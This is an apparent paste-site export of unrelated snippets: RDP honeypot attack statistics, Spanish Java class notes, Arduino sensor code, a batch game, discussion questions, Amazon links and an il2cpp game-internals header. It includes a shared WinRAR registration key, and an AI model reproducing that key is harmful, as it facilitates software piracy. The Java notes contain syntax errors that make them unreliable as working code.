    ""Pakistan"": 2
  },
  ""account"": {
    ""hello"": 92,
    ""(empty)"": 16,
    ""nmap"": 4,
    ""142.93.8.59"": 3688,
    ""Test"": 24,
    ""PeJnKfbaO"": 2,
    ""uWgcGq"": 2,
    ""WqFGCF"": 2,
    ""Domain"": 20,
    ""ZASxTcMgO"": 2,
    ""ICknSa"": 2,
    ""MhGMaZ"": 2,
    ""Administrator"": 2,
    ""Administr"": 10,
    ""QPEUsGAWX"": 2,
    ""LrTJnC"": 2,
    ""pmChfS"": 2,
    ""BGfjeNPLQ"": 2,
    ""zCUTNb"": 2,
    ""kfgBLT"": 2
  },
  ""keyboard"": {
    ""Unknown"": 3880
  },
  ""client_build"": {
    ""Unknown"": 3880
  },
  ""client_name"": {
    ""Unknown"": 3880
  },
  ""ip_type"": {
    ""Unknown"": 2514,
    ""proxy"": 12,
    ""hosting"": 1220,
    ""hosting & proxy"": 134
  }
}"
LyF0bhDu,2023-11-23_stats.json,rdp_snitch,JSON,Thursday 23rd of November 2023 06:15:09 PM CDT,"{
  ""ip"": {
    ""194.165.17.21"": 22,
    ""58.218.204.183"": 4,
    ""139.162.175.215"": 4,
    ""152.32.183.240"": 1,
    ""149.28.150.188"": 40,
    ""66.42.53.73"": 32,
    ""45.32.117.150"": 29,
    ""45.77.40.213"": 36,
    ""149.28.153.131"": 35,
    ""139.180.157.173"": 34,
    ""207.148.126.207"": 38,
    ""139.180.157.26"": 34,
    ""207.148.78.121"": 36,
    ""139.180.145.140"": 34,
    ""139.180.211.93"": 31,
    ""207.148.69.220"": 35,
    ""139.180.137.38"": 39,
    ""45.76.187.113"": 37,
    ""149.28.157.98"": 26,
    ""45.76.153.222"": 40,
    ""207.148.74.151"": 32,
    ""139.180.159.130"": 29,
    ""149.28.143.22"": 29,
    ""163.177.115.88"": 1,
    ""45.227.254.49"": 2,
    ""62.204.41.132"": 9,
    ""103.149.137.93"": 491,
    ""94.232.41.30"": 1,
    ""103.30.10.17"": 217,
    ""103.209.61.132"": 488,
    ""106.116.169.71"": 1,
    ""185.220.103.12"": 1,
    ""205.210.31.107"": 3,
    ""212.70.149.146"": 1,
    ""141.98.11.169"": 3,
    ""162.142.125.222"": 1,
    ""94.102.61.23"": 1,
    ""67.133.192.80"": 1,
    ""194.165.16.76"": 2,
    ""205.210.31.136"": 3,
    ""103.47.194.135"": 2,
    ""103.231.59.163"": 7,
    ""185.156.72.20"": 1,
    ""152.32.159.79"": 1,
    ""141.98.81.155"": 1,
    ""45.227.254.55"": 2,
    ""205.210.31.48"": 3,
    ""185.73.124.50"": 2,
    ""52.144.46.129"": 1,
    ""162.209.206.10"": 3,
    ""185.170.144.3"": 1,
    ""36.91.222.100"": 1,
    ""203.124.37.152"": 1,
    ""23.230.171.15"": 1,
    ""198.235.24.171"": 3,
    ""205.164.28.218"": 2,
    ""176.113.115.65"": 1,
    ""45.227.254.48"": 2,
    ""45.77.71.172"": 2
  },
  ""asn"": {
    ""AS48721"": 24,
    ""AS4134"": 5,
    ""AS63949"": 4,
    ""AS135377"": 2,
    ""AS20473"": 648,
    ""AS17816"": 1,
    ""AS267784"": 6,
    ""AS59425"": 9,
    ""AS63737"": 1196,
    ""AS208091"": 3,
    ""AS4224"": 1,
    ""AS396982"": 12,
    ""AS204428"": 1,
    ""AS209605"": 3,
    ""AS398324"": 1,
    ""AS202425"": 1,
    ""AS209"": 1,
    ""AS140832"": 2,
    ""AS132335"": 7,
    ""AS61432"": 1,
    ""AS209588"": 1,
    ""AS36007"": 1,
    ""AS40065"": 3,
    ""AS197414"": 1,
    ""AS7713"": 1,
    ""AS7590"": 1,
    ""AS14315"": 1,
    ""AS149440"": 2,
    ""AS57678"": 1
  },
  ""isp"": {
    ""Flyservers S.A."": 31,
    ""Chinanet"": 5,
    ""Akamai Technologies, Inc."": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""The Constant Company"": 234,
    ""Choopa"": 414,
    ""China Unicom Guangdong Province Network"": 1,
    ""Horizon LLC"": 9,
    ""Vietserver Services Technology Company Limited"": 979,
    ""Xhost Internet Solutions LP"": 4,
    ""SKY"": 217,
    ""The Calyx Institute"": 1,
    ""Google LLC"": 12,
    ""SS-Net"": 1,
    ""UAB Host Baltic"": 3,
    ""Censys, Inc."": 1,
    ""IP Volume inc"": 1,
    ""CenturyLink"": 1,
    ""FTECH"": 2,
    ""LeapSwitch Networks Pvt Ltd"": 7,
    ""TOV VAIZ PARTNER"": 1,
    ""Kamatera, Inc."": 1,
    ""CloudRadium L.L.C"": 3,
    ""PT Telekomunikasi Indonesia"": 1,
    ""COMSATS"": 1,
    ""Ipxo LLC"": 1,
    ""EGIHosting"": 2,
    ""Cat Technologies Co. Limited"": 1
  },
  ""org"": {
    ""Flyservers S.A"": 25,
    ""Chinanet JS"": 4,
    ""Linode, LLC"": 4,
    ""Ucloud Information Technology"": 2,
    ""Vultr Holdings, LLC"": 274,
    ""Unknown"": 381,
    ""UAB Host Baltic"": 6,
    ""Horizon LLC"": 9,
    ""Siddhi Cable And Network Private Limited"": 491,
    ""Dmitriy Panchenko"": 1,
    ""Skynode Company Limited"": 217,
    ""T-media Digital Technology Company Limited"": 488,
    ""Chinanet HE"": 1,
    ""The Calyx Institute"": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""4Media Ltd"": 1,
    ""Censys Inc"": 1,
    ""AI Spera"": 1,
    ""CenturyLink, Inc"": 1,
    ""IPXO"": 7,
    ""TOV VAIZ PARTNER"": 1,
    ""Xhostis"": 3,
    ""Cloud Web Manage"": 1,
    ""zhang san"": 3,
    ""Telekomunikasi Indonesia"": 1,
    ""CIS HQ"": 1,
    ""Evoxt"": 2,
    ""Cat Technologies Co. Limited"": 1
  },
  ""regionName"": {
    ""Kaunas"": 27,
    ""Jiangsu"": 4,
    ""Hesse"": 4,
    ""Virginia"": 1,
    ""South West"": 585,
    ""Central Singapore"": 61,
    ""Guangdong"": 1,
    ""Vilnius"": 6,
    ""Moscow"": 10,
    ""Tinh Thai Binh"": 491,
    ""Perm Krai"": 1,
    ""Hanoi"": 705,
    ""Hebei"": 1,
    ""New York"": 3,
    ""California"": 19,
    ""Plovdiv"": 1,
    ""Michigan"": 1,
    ""North Holland"": 4,
    ""Tinh Thanh Hoa"": 2,
    ""Maharashtra"": 8,
    ""Kyiv City"": 1,
    ""Drenthe"": 1,
    ""Jakarta"": 1,
    ""Islamabad"": 1,
    ""South Carolina"": 1
  },
  ""country"": {
    ""Lithuania"": 33,
    ""China"": 6,
    ""Germany"": 4,
    ""United States"": 25,
    ""Singapore"": 646,
    ""Russia"": 11,
    ""Vietnam"": 1198,
    ""Bulgaria"": 1,
    ""Netherlands"": 5,
    ""India"": 8,
    ""Ukraine"": 1,
    ""Indonesia"": 1,
    ""Pakistan"": 1
  },
  ""account"": {
    ""hello"": 46,
    ""(empty)"": 8,
    ""nmap"": 2,
    ""142.93.8.59"": 1844,
    ""Test"": 12,
    ""PeJnKfbaO"": 1,
    ""uWgcGq"": 1,
    ""WqFGCF"": 1,
    ""Domain"": 10,
    ""ZASxTcMgO"": 1,
    ""ICknSa"": 1,
    ""MhGMaZ"": 1,
    ""Administrator"": 1,
    ""Administr"": 5,
    ""QPEUsGAWX"": 1,
    ""LrTJnC"": 1,
    ""pmChfS"": 1,
    ""BGfjeNPLQ"": 1,
    ""zCUTNb"": 1,
    ""kfgBLT"": 1
  },
  ""keyboard"": {
    ""Unknown"": 1940
  },
  ""client_build"": {
    ""Unknown"": 1940
  },
  ""client_name"": {
    ""Unknown"": 1940
  },
  ""ip_type"": {
    ""Unknown"": 1257,
    ""proxy"": 6,
    ""hosting"": 610,
    ""hosting & proxy"": 67
  }
}"
dc0Jtnih,clases-interfaces,teslariu,Java,Thursday 23rd of November 2023 06:06:44 PM CDT,"/*
* Clases abstractas, concretas, polimorfismo, interfaces
*
*
*
*/


public class Cliente {
	
	String cuit;                               
	String direccion;
	float saldo;
	
	public void extraer(int monto) {
		if (saldo >= monto){
			saldo = saldo - monto
		}
	}
	
}


class ClientePyme extends Cliente {
	
	String razonSocial;
	float descubierto;
	
	public void extraer(int monto) {
		if (saldo + descubierto >= monto){
			saldo = saldo - monto
		}
}

abstract class Vehiculo{
	boolean conductor;
	boolean motor;
	
	abstract void mover();
	}


///////////////////////////////////////////////////

////  INTERFAZ UNICA

public interface Vehiculo(
	public float maxVel;
	public void arrancar();
	public void detener();
)

public class Auto implements Vehiculo(
	public void arrancar(){
			System.out.println(""Arrancando..."");
	}
	
	public void detener(){
			System.out.println(""Deteniendo..."");
	}
)

// Creo un auto
Vehiculo miAuto = new Auto();


//  polimorfismo
public class Camion implements Vehiculo(
	public void arrancar(){
			System.out.println(""Arrancando el camión..."");
	}
	
	public void detener(){
			System.out.println(""Deteniendo el camión..."");
	}
)

// Creo un camión
Vehiculo miCamion = new Camion();


//// INTERFACES MULTIPLES
public interface GPS{
	public String getCoordenadas();            
}

public interface Radio {                       
	public void encenderRadio();
	public void apagarRadio(); 
}

public class Smartphone implements GPS,Radio {
	public String getCoordenadas(){
			// return coordenadas;
	}
	
	public void encenderRadio(){
			System.out.println(""Encendiendo radio..."");
	}
	
	public void apagarRadio(){
			System.out.println(""Apagando radio..."");
	}

}


/// Clase final: es una clase QUE NO PUEDE SER EXTENDIDA (no se puede heredar,no puede tener subclases)

final class Persona{
	
	String Nombre;
	String Apellido;
	int DNI;
	
	/// getters y setters
	// puedo declarar algun metodo final
	final void mostrar(){
			System.out.println(""No tengo hereredos..."");
		}
	}

// Un atributo de Clase tambien llamados ESTATICOS: pertenece a TODA LA CLASE
// y no a un objeto en particular; son estaticos (constantes)

// clase Perro:
// a. metodos: correr, jugar, caminar, saltar, etc
// b. atributos: raza, especie = ""Canis familiaris""









"
dWLt6XsV,rarreg.key,huezohuezo1990,Bash,Thursday 23rd of November 2023 05:37:33 PM CDT,"RAR registration data
WinRAR
Unlimited Company License
UID=4b914fb772c8376bf571
6412212250f5711ad072cf351cfa39e2851192daf8a362681bbb1d
cd48da1d14d995f0bbf960fce6cb5ffde62890079861be57638717
7131ced835ed65cc743d9777f2ea71a8e32c7e593cf66794343565
b41bcf56929486b8bcdac33d50ecf773996052598f1f556defffbd
982fbe71e93df6b6346c37a3890f3c7edc65d7f5455470d13d1190
6e6fb824bcf25f155547b5fc41901ad58c0992f570be1cf5608ba9
aef69d48c864bcd72d15163897773d314187f6a9af350808719796
"
v4CYe5fD,Untitled,hidromotic,C,Thursday 23rd of November 2023 05:27:32 PM CDT,"#include <DFRobot_RGBLCD1602.h>
#include ""Ultrasonic.h""

// Pines de Sensores y configuracion inicial de la pantalla LCD
Ultrasonic SENSOR_ULTRASONICO_DELANTERO(2, 3);
Ultrasonic SENSOR_ULTRASONICO_TRASERO(11, 10);
DFRobot_RGBLCD1602 lcd(0x27, 16, 2);

// Definiciones de los parametros del buzzer
#define BUZZER_PIN        9
#define FREQUENCIA         800
#define CONFIGURAR_BUZZER  pinMode(BUZZER_PIN, OUTPUT)
#define PRENDER_BUZZER     tone(BUZZER_PIN, FREQUENCIA)
#define APAGAR_BUZZER      noTone(BUZZER_PIN)

// Definiciones de los Led´s delanteros y traseros
#define LED_DELANTERO_PIN        4
#define CONFIGURAR_LED_DELANTERO pinMode(LED_DELANTERO_PIN, OUTPUT)
#define PRENDER_LED_DELANTERO    digitalWrite(LED_DELANTERO_PIN, HIGH)

#define LED_TRASERO_PIN          12
#define CONFIGURAR_LED_TRASERO   pinMode(LED_TRASERO_PIN, OUTPUT)
#define PRENDER_LED_TRASERO      digitalWrite(LED_TRASERO_PIN, HIGH)

// Definiciones de la lectura de distancia de los sensores
#define DISTANCIA_DELANTERA     SENSOR_ULTRASONICO_DELANTERO.read()
#define DISTANCIA_TRASERA       SENSOR_ULTRASONICO_TRASERO.read()

// Definicion sobre la distancia limite de los sensores
#define DISTANCIA_LIMITE        20

// Definciones del LedTest
#define MS_INTERVALO_LED_TEST   250 //Function LedTest()
#define LED_TEST                LED_BUILTIN
#define CONFIG_LED_TEST         pinMode(LED_TEST, OUTPUT)
#define ACTUALIZAR_LED_TEST(x)  digitalWrite(LED_TEST, x)

// Variables globales utilizadas en el codigo
bool pantallaLimpia = false;
bool mostrarAlarma = false;
bool mostrarDistancia = true;
bool alarmaActiva = true;

unsigned long tiempoActualizacion = 0;
unsigned long intervalo = 250;

//-----------------------------------------------------

void setup() {
  CONFIG_LED_TEST;
  ACTUALIZAR_LED_TEST(0);
  CONFIGURAR_LED_DELANTERO;
  CONFIGURAR_LED_TRASERO;
  CONFIGURAR_BUZZER;
  APAGAR_BUZZER;
  lcd.init();
  lcd.setCursor(0, 0);
  lcd.print(""Distancia1:  "");
  lcd.setCursor(0, 1);
  lcd.print(""Distancia2:  "");
}

void loop() {
  LedTest();
  medirDistanciaSensoresUltrasonicos();
  controlarBuzzers();

  //UNIFICAR LA VISUALIZACION DEL LCD EN UNA ÚNICA FUNCIÓN, que podría llamarse ActualizaDisplay();
  actualizarLCD(DISTANCIA_DELANTERA);
  actualizarLCD(DISTANCIA_TRASERA);
  valoresLeds();
}

//-----------------------------------------------------

void LedTest() {
  static int ledState = 0;
  static unsigned long antMillis = 0;

  if (millis() - antMillis < MS_INTERVALO_LED_TEST) return;

  antMillis = millis();
  ledState = !ledState;
  ACTUALIZAR_LED_TEST(ledState);
}

//-----------------------------------------------------

void medirDistanciaSensoresUltrasonicos() {
  unsigned long currentTime = millis();
  //tiempoActualizacion NO DEBE SER GLOBAL... DEBE SER LOCAL A LA FUNCIÓN
  
  if (currentTime - tiempoActualizacion >= intervalo) return;
  medirDistanciaSensor1();
  medirDistanciaSensor2();
  verificarDistanciaSensores();
  tiempoActualizacion = currentTime;
}

//-----------------------------------------------------

void valoresLeds() {
  
  int ledDelantero = LED_DELANTERO_PIN;
  int brilloLedDelantero = 255;
  int intervaloDelantero = 500;
  int distanciaDelantera = 1;

 
  int ledTrasero = LED_TRASERO_PIN;
  int brilloLedTrasero = 255;
  int intervaloTrasero = 500;
  int distanciaTrasera = 1;

  
  parpadeoLedDelanteros(ledDelantero, brilloLedDelantero, intervaloDelantero, distanciaDelantera);
  parpadeoLedTraseros(ledTrasero, brilloLedTrasero, intervaloTrasero, distanciaTrasera);
}

void actualizarLCD(int valorDistancia) {
  lcd.setCursor(12, 0);
  lcd.print(""   "");

  if (mostrarDistancia) {
    lcd.setCursor(12, 0);
    lcd.print(valorDistancia);
  }
}

void controlarBuzzers() {
  unsigned long currentTime = millis();

  if (currentTime - tiempoActualizacion >= intervalo) return;
  controlarBuzzerDelantero(DISTANCIA_DELANTERA, BUZZER_PIN);
  controlarBuzzerTrasero(DISTANCIA_TRASERA, BUZZER_PIN);
  tiempoActualizacion = currentTime;
}

//-----------------------------------------------------

void controlarBuzzerDelantero(int distancia, int buzzerPin) {
  //digitalWrite(buzzerPin, distancia == 0 ? HIGH : LOW);
  /*
  if(!distancia) ACTIVAR_BUZZER;
  else          DESACTIVAR_BUZZER;
}
*/
void controlarBuzzerTrasero(int distancia, int buzzerPin) {
  digitalWrite(buzzerPin, distancia == 0 ? HIGH : LOW);
}

//-----------------------------------------------------

void medirDistanciaSensores(int distancia, int ledPin, int buzzerPin) {
  int frequenciaBuzzer = map(distancia, 0, DISTANCIA_LIMITE, 800, 1000);
  int valorPWM = map(distancia, 0, DISTANCIA_LIMITE, 255, 0);
  int mapearIntervalo = map(distancia, 0, DISTANCIA_LIMITE, 255, 100);

  parpadeoLed(ledPin, valorPWM, mapearIntervalo, distancia);
  actualizarLCD(distancia);
}

//-----------------------------------------------------
/*
void medirDistancia() {
  medirDistanciaSensores(DISTANCIA_DELANTERA, LED_DELANTERO_PIN, BUZZER_PIN);
  medirDistanciaSensores(DISTANCIA_TRASERA, LED_TRASERO_PIN, BUZZER_PIN);
}
*/
void medirDistanciaSensor1() {
  medirDistanciaSensores(DISTANCIA_DELANTERA, LED_DELANTERO_PIN, BUZZER_PIN);
}

void medirDistanciaSensor2() {
  medirDistanciaSensores(DISTANCIA_TRASERA, LED_TRASERO_PIN, BUZZER_PIN);
}

//-----------------------------------------------------

void verificarDistanciaSensores() {

  //REMOVER DE ESTA FUNCIÓN TODO LO RELACIONADO CON LA VISUALIZACIÓN
  
  //REEMPLAZAR POR IF RÁPIDO para alarmaActiva
  if (DISTANCIA_DELANTERA <= DISTANCIA_LIMITE || DISTANCIA_TRASERA <= DISTANCIA_LIMITE)alarmaActiva = true;
  else alarmaActiva = false;
  
  if (!pantallaLimpia) {
    lcd.clear();
    pantallaLimpia = true;
  }

  lcd.setCursor(0, 0);
  lcd.print(""Distancia1:    "");
  lcd.setCursor(0, 1);
  lcd.print(""Distancia2:    "");

  if (!alarmaActiva) {
    lcd.setCursor(12, 0);
    lcd.print(DISTANCIA_DELANTERA);
    lcd.setCursor(12, 1);
    lcd.print(DISTANCIA_TRASERA);
    APAGAR_BUZZER;

    if (mostrarAlarma) {
      lcd.setCursor(1, 0);
      lcd.print(""                   "");
      lcd.setCursor(2, 1);
      lcd.print(""                   "");
      mostrarAlarma = false;
    }
  } else {
    lcd.setCursor(0, 0);
    lcd.print(""  DETENGA SU      "");
    lcd.setCursor(0, 1);
    lcd.print(""  VEHICULO       "");

    mostrarAlarma = true;
    mostrarDistancia = false;
    PRENDER_BUZZER;
  }
}

//-----------------------------------------------------

void parpadeoLed(int led, int brillo, int intervalo, int distancia) {
  
  static unsigned long previousMillis = 0;
  static bool ledState = LOW;
  unsigned long currentMillis = millis();

  if (currentMillis - previousMillis < intervalo) return;
  previousMillis = currentMillis;
  ledState = !ledState;

  distancia == 0 ? (PRENDER_LED_DELANTERO, PRENDER_LED_TRASERO) : analogWrite(led, brillo * ledState);
}

void parpadeoLedDelanteros(int ledDelantero, int brilloLed, int intervalo, int distanciaDelantera) {
  parpadeoLed(ledDelantero, brilloLed, intervalo, distanciaDelantera);
}

void parpadeoLedTraseros(int ledTrasero, int brilloLed, int intervalo, int distanciaTrasera) {
  parpadeoLed(ledTrasero, brilloLed, intervalo, distanciaTrasera);
}"
B0VHm1VB,Village Manager,CheikoAsami,Batch,Thursday 23rd of November 2023 04:10:59 PM CDT,"@echo off
title Village Manager
:header
cls
echo ------------------------
echo   Head of the Village
echo ------------------------
echo 1- Start Game
echo 2- Exit
echo ------------------------
choice /c 12 /n >nul

if %errorlevel% == 1 (
	call :data
	set /p name=Enter name of Village:
	goto game
)
if %errorlevel% == 2 exit
goto header

:data
set name=Nameless Village
set gold=100
set pop=0
set villagers=5
set militia=5
set livestock=0
set grain=0
set grainSkill=0
set grainLoss=0
set deathTollVillagers=0
set deathTollMilitia=0

set tax=1
set resourceActs=0

set fleeChances=0
set fleeChance=15
set raids=0
set raidChance=0
set raidType=0
set raidToggle=0
set daysUntilRaid=0
set days=0
set years=0
set time=0
set timeRate=9999

set state=Start
goto:eof

:status
set /a pop=%militia%+%villagers%
if %pop% LEQ 0 (
	goto gameover
)
if %resourceActs% EQU 0 set acting=No Actions being Taken, Have the Village do something in Managment!
if %resourceActs% EQU 1 set acting=The Villagers are Growing Grain
if %resourceActs% EQU 2 set acting=The Villagers are Raising Livestock
if %resourceActs% EQU 3 set acting=The Villagers are Expanding Population

if %days% GEQ 365 (
	set days=0
	set /a years+=1
)
goto:eof

:gameover
cls
echo ------------------------------------------------------------------------
echo     Pity, your village is now desolate! Everyone is dead and rotting.
echo ------------------------------------------------------------------------
echo You lasted %years% Years and %days% Days, surviving %raids% Raids on your village.
echo ------------------------------------------------------------------------
echo Press any Key to Return to Menu...
pause>nul
goto header

:game
call :status
cls
echo -----------------------------------------
echo Village Name: %name% /\ Gold: %gold% /\ Population: %pop%
echo -
echo Villagers: %villagers%
echo Militia: %militia%
echo -----------------------------------------
echo Time Since Establishment: Day: %days% Year: %years%
echo -
echo Behavior: %acting%
echo -
echo Grain: %grain%
echo Livestock: %livestock%
if %daysUntilRaid% GTR 0 echo -
if %daysUntilRaid% GTR 0 echo Days Remaining Until Raid:%daysUntilRaid%
echo -
echo Raid Roll: %raidChance%/50
echo -----------------------------------------
echo 1- %state% Time
echo 2- Management
echo 3- Options
echo -----------------------------------------
choice /d 4 /t %timeRate% /c 1234 /n >nul
if %errorlevel% == 1 (
	if %raidToggle% EQU 1 (
		if %daysUntilRaid% EQU 0 (
		goto raidOutcome
		)
	)
	if %time% EQU 1 (
		set time=0
		set timeRate=9999
		set state=Start
	) else (
	set state=Stop
	set time=1
	set timeRate=2
	)
)
if %errorlevel% == 2 (
	goto management
)
if %errorlevel% == 3 (
	goto options
)
if %errorlevel% == 4 (
	if %time% EQU 1 (
		call :progress
	)
)
goto game

:raided
set /a raidType=%random%%%2+1
if %militia% GTR 0 (
	set /a fleeChances=%random%%%100+1
	set /a fleeChance=%militia%*2
	if %fleeChances% GEQ %fleeChance% (
		set /a raidType=3
	)
)
set /a halfGrain=%grain% / 2
set /a halfPop=%villagers% / 2
set /a halfMil=%militia% / 3

set /a deathTollVillagers=%random%%%%halfPop%+1
set /a deathTollMilitia=%random%%%%halfMil%+1
set /a grainLoss=%random%%%%halfGrain%+1

call :raidTypes

set /a raids+=1
set raidToggle=0
goto:eof

:raidTypes
if %raidType% EQU 1 (
	set raidedType=They didn't want your goods they wanted death! %deathTollVillagers% Villagers and %deathTollMilitia% Militia lives had been lost in the Raid!
	set /a villagers-=%deathTollVillagers%
	set /a militia-=%deathTollMilitia%
)
if %raidType% EQU 2 (
	set raidedType=To not hurt anyone, the Raiders were quite hungry and stole %grainLoss% grain from the village!
	set /a grain-=%grainLoss%
)
if %raidType% EQU 3 (
	set raidedType=To flee your borders, your militia force diswayed them from attacking! %fleeChances%/%fleeChance%
)
goto:eof

:raidOutcome
call :raided
cls
echo -------------------------------------
echo The Village of %name% is being Raided!
echo The Raiders decided, %raidedType%
echo -------------------------------------
echo
pause>nul
goto game

:raidTimer
if %raidChance% GTR 50 (
	set raidToggle=1
	set /a daysUntilRaid=%random%%%120+1
)
goto:eof

:progress
if %raidToggle% EQU 0 (
	set /a days+=1
	set /a gold+=%pop%+%tax%
	set /a raidChance=%random%%%65+1
	call :raidTimer
)
if %raidToggle% EQU 1 (
	if %daysUntilRaid% EQU 0 (
		set time=0
		set timeRate=9999
		set state=Raid
	)
	if %daysUntilRaid% GTR 0 (
		set /a days+=1
		set /a gold+=%pop%+%tax%
		set /a daysUntilRaid-=1
	)
	
)

if %resourceActs% EQU 1 (
	set /a grain+=%pop%+%grainSkill%
)
if %resourceActs% EQU 2 (
	if %grain% GEQ 15 (
		set /a grain-=15
		set /a livestock+=1
	) else (set resourceActs=1)	
)
if %resourceActs% EQU 3 (
	if %grain% GEQ 15 (
		if %livestock% GEQ 1 (
			set /a grain-=15
			set /a livestock-=1
			set /a villagers+=2
		) else (set resourceActs=1)
	) else (set resourceActs=1)
	
)
goto:eof



:management
cls
echo ----------------------------------
echo            Management
echo ----------------------------------
echo 1- Actions
echo 2- Stock
echo 3- Return
echo ----------------------------------
choice /c 123 /n >nul
if %errorlevel% == 1 (
	goto villageActions
)
if %errorlevel% == 2 (
	call :stock
)
if %errorlevel% == 3 (
	goto game
)
goto management

:villageActions
cls
echo ------------------------------------
echo             Actions
echo ------------------------------------
echo 1- Resource Managment
echo 2- Citizen Management
echo 3- Return
echo ------------------------------------
choice /c 123 /n >nul
if %errorlevel% == 1 (
	cls
	echo ------------------------
	echo Grain: %grain%
	echo Livestock: %livestock%
	echo ------------------------
	echo 0-No Action
	echo 1-Grow Grain
	echo 2-Raise Livestock -Consumes -15 Grain
	echo 3-Grow Population -Consumes -1 Livestock and -15 Grain
	echo ------------------------
	set /p resourceActs=Enter Action to Take:
	call :actionTaken
)
if %errorlevel% == 3 (
	goto management
)
goto villageActions

:actionTaken
if %resourceActs% EQU 0 (
	echo The Village will take no action
)
if %resourceActs% EQU 1 (
	echo The Village will now Grow Grain.
)
if %resourceActs% EQU 2 (
	echo The Village will now Raise Livestock.
)
if %resourceActs% EQU 3 (
	echo The Village will now consume to flourish.
)
pause>nul
goto:eof

:stock
cls
echo ---------------------------------
echo            Stock
echo ---------------------------------
echo Grain: %grain%
echo Livestock: %livestock%
echo ---------------------------------
pause>nul
goto:eof
"
uhyseNjf,Question of the Day,airglasty,JSON,Thursday 23rd of November 2023 03:29:27 PM CDT,"What superpower would you never want to have?;
Which name would you choose if you had to rename yourself?;
What's the worst colour that has ever been invented?;
What is your favourite board game?;
What is the dumbest way you've been injured?;
If you could date a video game villain, who would it be?;
What specific game logic would you like to be applied to real life?;
What's the pettiest reason you've ever disliked a character in a game?;
If you could hang out in any in-game location for a day, where would it be?;
Which game soundtrack would you want in the background of your life?;
If you could get any animal as a pet from a game, what would you pick?;
What horror game do you think you'd have the best chance of survival in real life?; 

"
0mx9Z5jM,Untitled,G0nz0uk,HTML,Thursday 23rd of November 2023 03:28:39 PM CDT,"https://www.amazon.co.uk/Samsung-Odyssey-LS32BG650EUXXU-Curved-Monitor/dp/B0BMM6MP3J/ref=sr_1_2_sspa?crid=1SW9OMK5FS9G2&keywords=1440p%2B240hz%2Boled&qid=1700773513&sprefix=1440p%2B240hz%2Bole%2Caps%2C91&sr=8-2-spons&ufe=app_do%3Aamzn1.fos.16386313-b7bf-4b29-bfa1-0d3d5f3a0dd5&sp_csd=d2lkZ2V0TmFtZT1zcF9hdGY&th=1

https://www.amazon.co.uk/AOC-AG274QG-Widescreen-NVIDIA-G-SYNC/dp/B09PVDNJCY/ref=sr_1_4?crid=1RQ2NH9S5T9H6&keywords=1440p+240hz+monitor&qid=1700774011&sprefix=1440p+240hz%2Caps%2C96&sr=8-4&ufe=app_do%3Aamzn1.fos.23648568-4ba5-49f2-9aa6-31ae75f1e9cd

https://www.amazon.co.uk/KOORUI-Monitor-Adaptive-DisplayPort-GN05/dp/B0CC911GK6/ref=sxin_17_pa_sp_search_thematic_sspa?content-id=amzn1.sym.431c6c06-e77e-44d9-a42c-721ab4612e9e%3Aamzn1.sym.431c6c06-e77e-44d9-a42c-721ab4612e9e&crid=1RQ2NH9S5T9H6&cv_ct_cx=1440p%2B240hz%2Bmonitor&keywords=1440p%2B240hz%2Bmonitor&pd_rd_i=B0CC911GK6&pd_rd_r=30022e43-a13d-4320-96f0-d6d602e99045&pd_rd_w=zC7Ng&pd_rd_wg=bYFRF&pf_rd_p=431c6c06-e77e-44d9-a42c-721ab4612e9e&pf_rd_r=ZHC1AVEWCJC8Y6HJKJQ6&qid=1700774101&sbo=RZvfv%2F%2FHxDF%2BO5021pAnSA%3D%3D&sprefix=1440p%2B240hz%2Caps%2C96&sr=1-2-ad3222ed-9545-4dc8-8dd8-6b2cb5278509-spons&ufe=app_do%3Aamzn1.fos.23648568-4ba5-49f2-9aa6-31ae75f1e9cd&sp_csd=d2lkZ2V0TmFtZT1zcF9zZWFyY2hfdGhlbWF0aWM&th=1

https://www.amazon.co.uk/HP-Gaming-Monitor-FreeSync2-Black/dp/B07SCX1JG2/ref=sr_1_9?crid=1RQ2NH9S5T9H6&keywords=1440p+240hz+monitor&qid=1700774101&sprefix=1440p+240hz%2Caps%2C96&sr=8-9&ufe=app_do%3Aamzn1.fos.23648568-4ba5-49f2-9aa6-31ae75f1e9cd

https://www.amazon.co.uk/AOC-C27G2ZU-BK-Inches-Monitor/dp/B08897N6HJ/ref=sr_1_14?crid=1RQ2NH9S5T9H6&keywords=1440p+240hz+monitor&qid=1700774101&sprefix=1440p+240hz%2Caps%2C96&sr=8-14&ufe=app_do%3Aamzn1.fos.23648568-4ba5-49f2-9aa6-31ae75f1e9cd"
XpW1DrK9,il2.hpp,TylerBubba,C++,Thursday 23rd of November 2023 02:56:55 PM CDT,"#pragma once

#include <string>

#include ""./importer.hpp""

#define CREATE_TYPE( name, args ) using il2cpp_##name = args; inline il2cpp_##name name;
#define ASSIGN_TYPE( name ) name = TYPE( L""GameAssembly.dll"", il2cpp_##name );

#define FIELD( klass, name ) static std::uintptr_t name = il2cpp_lib::field( klass, #name, true );
#define TYPE_OBJECT( ns, name ) il2cpp_lib::type_object( ns, name )
#define ICALL( fn_name, name, args ) static auto fn_name = reinterpret_cast< args >( il2cpp_lib::resolve_icall( name ) );

#define METHOD( fn_name, name, arg_count, arg_name, selected_arg, args ) \
	static auto fn_name = reinterpret_cast< args >( *reinterpret_cast< std::uintptr_t* >( il2cpp_lib::method( name, arg_count, arg_name, selected_arg ) ) )

#define DECLARE_MEMBER( type, klass, name ) type & name( ) { FIELD( klass, ##name ) return *reinterpret_cast< type* >( this + name ); }

namespace il2cpp_lib {
	struct sanitized_method_t {
		std::string ns, kl, mt;
	};

	CREATE_TYPE(domain_get, std::uintptr_t(*)());
	CREATE_TYPE(class_get_methods, std::uintptr_t(*)(std::uintptr_t, std::uintptr_t*));
	CREATE_TYPE(method_get_param_count, int (*)(std::uintptr_t));
	CREATE_TYPE(assembly_get_image, std::uintptr_t(*)(std::uintptr_t));
	CREATE_TYPE(domain_get_assemblies, std::uintptr_t* (*)(void* domain, std::uintptr_t* size));
	CREATE_TYPE(object_new, std::uintptr_t(*)(std::uintptr_t));
	CREATE_TYPE(class_from_name, std::uintptr_t(*)(std::uintptr_t, const char*, const char*));
	CREATE_TYPE(resolve_icall, std::uintptr_t(*)(const char*));
	CREATE_TYPE(field_static_get_value, std::uintptr_t(*)(std::uintptr_t, std::uintptr_t*));
	CREATE_TYPE(class_get_fields, std::uintptr_t(*)(std::uintptr_t, std::uintptr_t*));
	CREATE_TYPE(field_get_offset, std::uintptr_t(*)(std::uintptr_t));
	CREATE_TYPE(string_new_wrapper, std::uintptr_t(*)(const char*));
	CREATE_TYPE(class_get_type, std::uintptr_t(*)(std::uintptr_t));
